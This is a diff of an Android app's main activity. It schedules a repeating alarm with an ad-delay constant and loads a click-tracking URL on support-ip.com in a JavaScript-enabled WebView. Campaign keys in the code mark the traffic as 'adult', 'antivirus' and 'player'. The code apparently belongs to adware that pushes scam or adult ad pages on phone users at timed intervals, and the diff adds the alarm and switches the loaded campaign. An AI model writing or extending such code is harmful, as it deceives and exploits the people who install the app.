@@ -22,7 +22,6 @@ public class MainActivity extends AppCompatActivity {
 
     AlarmStuff as;
     private WebView webView;
-    private TextView textView;
 
 
     @Override
@@ -30,25 +29,22 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.frame_activity);
 
-//        textView = (TextView)  findViewById(R.id.textView1);
-//        textView.setVisibility(View.VISIBLE);
-
+        as = new AlarmStuff();
+        as.setRepeatingAlarm(MainActivity.this, AlarmStuff.DELAY_ADV);
 
         webView = (WebView) findViewById(R.id.webView1);
         webView.getSettings().setJavaScriptEnabled(true);
         webView.setWebViewClient(new WebViewClient());
 
         // antivirus
-        //  webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=anund");
+//          webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=anund");
 
         // adult
-        webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=adund");
-//        webView.setVisibility(View.VISIBLE);
+        webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=adundfr");
 
-        as = new AlarmStuff();
-//         3600 * 4 * 1000 = 4 часа = 14400000 мс
-//        as.setRepeatingAlarm(MainActivity.this, 000);
-        as.setRepeatingAlarm(MainActivity.this, 14400000);
+        // player
+//        webView.loadUrl("http://support-ip.com/b/click.php?key=fire&с1=plund");
+
 
 
     }
